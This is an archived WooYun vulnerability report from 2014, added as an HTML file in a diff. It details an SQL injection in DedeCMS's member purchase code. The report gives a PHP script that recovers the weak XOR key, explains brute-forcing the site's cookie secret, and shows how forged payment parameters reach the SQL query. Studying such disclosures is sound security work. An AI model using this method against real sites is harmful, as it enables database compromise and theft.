@@ -1,0 +1,368 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		DedeCMS全版本通杀SQL注入(无任何限制)  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		DedeCMS全版本通杀SQL注入(无任何限制)  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/felixk3y">felixk3y</a> 
+</li><li>提交时间：		2014-02-24 14:34</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-02-24：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-02-25：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-02-28：	细节向第三方安全合作伙伴开放<br/>
+									2014-03-07：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-03-17：	细节向普通白帽子公开<br/>
+									2014-04-06：	细节向实习白帽子公开<br/>
+									2014-05-25：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">年前有人刷了N多DedeCMS的洞,个人表示很无语<br />
+粗略看了下,这些洞存在太大限制 <br />
+一句话总结：只要GPC一开，全部没法用...<br />
+试问现在哪个傻子会把GPC关掉... 98%都是打开的,所以哪...<br />
+今天这个洞，无视GPC，GPC你哪凉快 哪呆着去...<br />
+也一句话总结：很黄很暴力！</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">#1漏洞代码<br />
+<br />
+Tips: 全过程 $_SERVER[&quot;HTTP_USER_AGENT&quot;] 设置为空<br />
+<br />
+/member/buy_action.php 代码如下(只贴关键的代码)<br />
+<br />
+</p><pre><code>if(isset($pd_encode) &amp;&amp; isset($pd_verify) &amp;&amp; md5(&quot;payment&quot;.$pd_encode.$cfg_cookie_encode) == $pd_verify)<br />
+{<br />
+<br />
+    parse_str(mchStrCode($pd_encode,&#039;DECODE&#039;),$mch_Post);<br />
+    foreach($mch_Post as $k =&gt; $v) $$k = $v;<br />
+    $row  = $dsql-&gt;GetOne(&quot;SELECT * FROM #@__member_operation WHERE mid=&#039;$mid&#039; And sta=0 AND product=&#039;$product&#039;&quot;);<br />
+    if(!isset($row[&#039;buyid&#039;]))<br />
+    {<br />
+        ShowMsg(&quot;请不要重复提交表单!&quot;, &#039;javascript:;&#039;);<br />
+        exit();<br />
+    }<br />
+    if(!isset($paytype))<br />
+    {<br />
+        ShowMsg(&quot;请选择支付方式!&quot;, &#039;javascript:;&#039;);<br />
+        exit();<br />
+    }<br />
+    $buyid = $row[&#039;buyid&#039;];<br />
+<br />
+}</code></pre><p class='detail'><br />
+<br />
+我们来看看其中最关键的加密函数 mchStrCode() 168行<br />
+<br />
+</p><pre><code>function mchStrCode($string,$action=&#039;ENCODE&#039;)<br />
+{<br />
+    $key    = substr(md5($_SERVER[&quot;HTTP_USER_AGENT&quot;].$GLOBALS[&#039;cfg_cookie_encode&#039;]),8,18);<br />
+    $string    = $action == &#039;ENCODE&#039; ? $string : base64_decode($string);<br />
+    $len    = strlen($key);<br />
+    $code    = &#039;&#039;;<br />
+    for($i=0; $i&lt;strlen($string); $i++)<br />
+    {<br />
+        $k        = $i % $len;<br />
+        $code  .= $string[$i] ^ $key[$k];<br />
+    }<br />
+    $code = $action == &#039;DECODE&#039; ? $code : base64_encode($code);<br />
+    return $code;<br />
+}</code></pre><p class='detail'><br />
+<br />
+#2 逆向加密函数<br />
+<br />
+重点关注这行代码<br />
+<br />
+</p><pre><code>$code  .= $string[$i] ^ $key[$k];</code></pre><p class='detail'><br />
+<br />
+可以看出来这个加密算法很弱，采用简单的异或运算，我们知道异或运算是一种可逆的算法，比如：<br />
+<br />
+加密算法：密文 = 明文 ^ 密钥<br />
+<br />
+其中 密文、明文、密钥 只要知道其中的两个 便可以很容易的计算出剩下的那个<br />
+<br />
+通常我们只知道密文，但是如果我们知道与密文相对应的明文，哪怕只是一部分<br />
+<br />
+我们来看看DedeCMS给不给我们这个机会<br />
+<br />
+在会员中心 会员升级/点卡充值 处，购买新点卡 随便选择一中类型，点击购买 在后面购买并支付 抓包<br />
+<br />
+有这样一段密文：<br />
+<br />
+</p><pre><code>pd_encode=QEELURRVQVxbAEdTExNaXQsFFncBUQRjRgRKKHEKDUV3XFJRZUABRyhyaj5bCnhTAF4HDwEAVApQVgdSBgRZUANTEzN7aWVxY2AtcVwEVwMMUFFUAQFSCw8GVgRWBwBVBFcIV1QEAAdSClQEUhUgUAVTeQ5fCFtjXA5WBAcHCQBWBFYCAFgeJVBTUC9cXl9aZFoJUD5pVgp1BQAKAFQCCVRSCQRWVlZVV1hcUxNyezVsfnl2cXAvajRkeVwXBVBTUABeShlZVV4GUBMZWhFdE1RDXAxdF0ZcQA</code></pre><p class='detail'><br />
+<br />
+我们来看看对应的明文：<br />
+<br />
+</p><pre><code>product=card&amp;pid=1&amp;DedeUserID=8&amp;DedeUserID__ckMd5=4674d94cfd3ea16d&amp;PHPSESSID=2bb41dc4ba292f722ac1606a35da3b0b&amp;DedeLoginTime=1393217459&amp;DedeLoginTime__ckMd5=5710bf972c7cb9d2&amp;ENV_GOBACK_URL=/dedecms/member/operation.php</code></pre><p class='detail'><br />
+<br />
+经过分析可以得知<br />
+<br />
+1. product=card&amp;pid=1&amp;DedeUserID= 基本不会变化的<br />
+<br />
+2. /member/operation.php 基本不会变化的<br />
+<br />
+3. PHPSESSID=2bb41dc4ba292f722ac1606a35da3b0b 是可以从cookie知道的<br />
+<br />
+...<br />
+<br />
+接下来我们再看看加密密钥的长度：<br />
+<br />
+</p><pre><code>$key    = substr(md5($_SERVER[&quot;HTTP_USER_AGENT&quot;].$GLOBALS[&#039;cfg_cookie_encode&#039;]),8,18);</code></pre><p class='detail'><br />
+<br />
+很明显，密钥的长度为：18<br />
+<br />
+SO，综上所述 DedeCMS确实给了我们这样的机会，让我们可以逆向出 mchStrCode() 函数所用的加密密钥<br />
+<br />
+#3 获取加密密钥<br />
+<br />
+我们根据加密算法，可以很容易的写出逆向的算法<br />
+<br />
+</p><pre><code>&lt;?php<br />
+	$mingwen=&quot;product=card&amp;pid=1&amp;DedeUserID=&quot;;<br />
+	$miwen=&#039;QEELURRVQVxbAEdTExNaXQsFFncBUQRjRgRKKHEKDUV3XFJRZUABRyhyaj5bCnhTAF4HDwEAVApQVgdSBgRZUANTEzN7aWVxY2AtcVwEVwMMUFFUAQFSCw8GVgRWBwBVBFcIV1QEAAdSClQEUhUgUAVTeQ5fCFtjXA5WBAcHCQBWBFYCAFgeJVBTUC9cXl9aZFoJUD5pVgp1BQAKAFQCCVRSCQRWVlZVV1hcUxNyezVsfnl2cXAvajRkeVwXBVBTUABeShlZVV4GUBMZWhFdE1RDXAxdF0ZcQA&#039;;<br />
+	$miwen=base64_decode(urldecode($miwen));<br />
+	$len=strlen($mingwen);<br />
+	for($i=0;$i&lt;strlen($mingwen);$i++){<br />
+		$key  .= $miwen[$i] ^ $mingwen[$i];<br />
+	}<br />
+	echo &quot;Key is: &quot;.$key;<br />
+?&gt;</code></pre><p class='detail'><br />
+<br />
+运行结果为：03d5a65a8a575c396403d5a65a8a57<br />
+<br />
+可以看出 03d5a65a8a575c3964 重复进行运算，那么加密密钥为：03d5a65a8a575c3964<br />
+<br />
+#4 漏洞利用上篇<br />
+<br />
+ok 通过对加密函数的分析，我们可以逆向出加密的密钥，接下来 我们接着代码的细节<br />
+<br />
+4.1 加密密钥的生成：<br />
+<br />
+</p><pre><code>$key    = substr(md5($_SERVER[&quot;HTTP_USER_AGENT&quot;].$GLOBALS[&#039;cfg_cookie_encode&#039;]),8,18);</code></pre><p class='detail'><br />
+<br />
+4.2 进入漏洞代码的条件<br />
+<br />
+</p><pre><code>if(isset($pd_encode) &amp;&amp; isset($pd_verify) &amp;&amp; md5(&quot;payment&quot;.$pd_encode.$cfg_cookie_encode) == $pd_verify)</code></pre><p class='detail'><br />
+<br />
+重点关注下面的条件：<br />
+<br />
+</p><pre><code>md5(&quot;payment&quot;.$pd_encode.$cfg_cookie_encode) == $pd_verify</code></pre><p class='detail'><br />
+<br />
+一个全局变量进入了我们的眼帘：$cfg_cookie_encode cookie的加密密钥<br />
+<br />
+#3 全局变量 $cfg_cookie_encode 的获取<br />
+<br />
+在对加密函数的分析 得知，可以逆向出加密密钥，而恰巧 加密密钥的计算采用了$cfg_cookie_encode ，即<br />
+<br />
+加密密钥 = md5(UA.$cfg_cookie_encode) 而UA我们是可以伪造的，假设我们将UA设置为空，那么加密密钥就等于：substr(md5($cfg_cookie_encode),8,18)<br />
+<br />
+那么获取加密密钥后 我们是不是可以通过暴力破解 获取$cfg_cookie_encode呢?<br />
+<br />
+好 我们再来看看$cfg_cookie_encode是怎么生成的<br />
+<br />
+</p><pre><code>$rnd_cookieEncode = chr(mt_rand(ord(&#039;A&#039;),ord(&#039;Z&#039;))).chr(mt_rand(ord(&#039;a&#039;),ord(&#039;z&#039;))).chr(mt_rand(ord(&#039;A&#039;),ord(&#039;Z&#039;))).chr(mt_rand(ord(&#039;A&#039;),ord(&#039;Z&#039;))).chr(mt_rand(ord(&#039;a&#039;),ord(&#039;z&#039;))).mt_rand(1000,9999).chr(mt_rand(ord(&#039;A&#039;),ord(&#039;Z&#039;)));</code></pre><p class='detail'><br />
+<br />
+可以看出 $cfg_cookie_encode 长度为10位，格式为<br />
+<br />
+[A-Z][a-z][A-Z][A-Z][a-z][0-9][0-9][0-9][0-9][A-Z] 很有规律，是吧<br />
+<br />
+而我们在 #3 获取加密密钥 中获取了加密密钥为：03d5a65a8a575c3964<br />
+<br />
+那么去掉最后的两位即为 $cfg_cookie_encode 的16位MD5值(为什么去掉后面的两位，自己Google DedeCMS的加密算法去)。<br />
+<br />
+那还等什么 配置好EGB 暴力破解吧 结果如下<br />
+<br />
+</p><p class="detail"><a href="../images/241339503cb93dfd540938d465a356ace2afd524.jpg" target="_blank"><img src="../images/241339503cb93dfd540938d465a356ace2afd524.jpg" alt="md5.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+注：采用的是EGB.exe 64位 收费版 很短时间内就可以破解出来<br />
+<br />
+#5 漏洞利用下篇<br />
+<br />
+Good! 获取了$cfg_cookie_encode后 还有什么好说的，看漏洞代码吧<br />
+<br />
+</p><pre><code>if(isset($pd_encode) &amp;&amp; isset($pd_verify) &amp;&amp; md5(&quot;payment&quot;.$pd_encode.$cfg_cookie_encode) == $pd_verify)<br />
+{<br />
+	echo $pd_encode.&quot;&lt;br&gt;&quot;;<br />
+	echo mchStrCode($pd_encode,&#039;DECODE&#039;);exit;<br />
+<br />
+    parse_str(mchStrCode($pd_encode,&#039;DECODE&#039;),$mch_Post);<br />
+    foreach($mch_Post as $k =&gt; $v) $$k = $v;<br />
+    $row  = $dsql-&gt;GetOne(&quot;SELECT * FROM #@__member_operation WHERE mid=&#039;$mid&#039; And sta=0 AND product=&#039;$product&#039;&quot;);<br />
+    if(!isset($row[&#039;buyid&#039;]))<br />
+    {<br />
+        ShowMsg(&quot;请不要重复提交表单!&quot;, &#039;javascript:;&#039;);<br />
+        exit();<br />
+    }<br />
+    if(!isset($paytype))<br />
+    {<br />
+        ShowMsg(&quot;请选择支付方式!&quot;, &#039;javascript:;&#039;);<br />
+        exit();<br />
+    }<br />
+    $buyid = $row[&#039;buyid&#039;];<br />
+<br />
+}</code></pre><p class='detail'><br />
+<br />
+重点关注这三行代码<br />
+<br />
+</p><pre><code>parse_str(mchStrCode($pd_encode,&#039;DECODE&#039;),$mch_Post);<br />
+foreach($mch_Post as $k =&gt; $v) $$k = $v;<br />
+$row  = $dsql-&gt;GetOne(&quot;SELECT * FROM #@__member_operation WHERE mid=&#039;$mid&#039; And sta=0 AND product=&#039;$product&#039;&quot;);</code></pre><p class='detail'><br />
+<br />
+解密$pd_encode后，parse_str变量覆盖 $product,后直接进入SQL查询语句，造成注入漏洞<br />
+<br />
+但进入这三条语句有个条件<br />
+<br />
+</p><pre><code>md5(&quot;payment&quot;.$pd_encode.$cfg_cookie_encode) == $pd_verify</code></pre><p class='detail'><br />
+<br />
+重点在于这个等式是否成立，我们来分析 分析<br />
+<br />
+$pd_encode 我们可以控制，$pd_verify我们也可以控制，$cfg_cookie_encode这个变量在#4 漏洞利用上篇 已成功破解出来，因此我们也可以控制，全部变量都被我们控制了 难道还能不成立，SO... $cfg_cookie_encode突破了 神马都是小KS ...<br />
+<br />
+#6 漏洞利用POC<br />
+<br />
+这个漏洞重在其漏洞分析，遇到问题所采用的突破方法，只给个漏洞的POC,只为证明漏洞的的确确存在。<br />
+<br />
+</p><p class="detail"><a href="../images/24141429666680a8c33be4d9a7e129fc3c8e98be.jpg" target="_blank"><img src="../images/24141429666680a8c33be4d9a7e129fc3c8e98be.jpg" alt="22.jpg" width="600"/></a></p><p class="detail"> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">此漏洞重在研究系统加密算法的逆向，获取$cfg_cookie_encode的思路等，对于漏洞，仅给出POC<br />
+<br />
+</p><p class="detail"><a href="../images/24141429666680a8c33be4d9a7e129fc3c8e98be.jpg" target="_blank"><img src="../images/24141429666680a8c33be4d9a7e129fc3c8e98be.jpg" alt="22.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">使用强加密算法，可参考 PHPCMS 的算法 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/felixk3y" title="felixk3y">felixk3y</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-051889" title="DedeCMS全版本通杀SQL注入(无任何限制)">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：8 </p>
+													<p class="detail">确认时间：2014-02-25 13:09</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">已经修复</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="51889";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
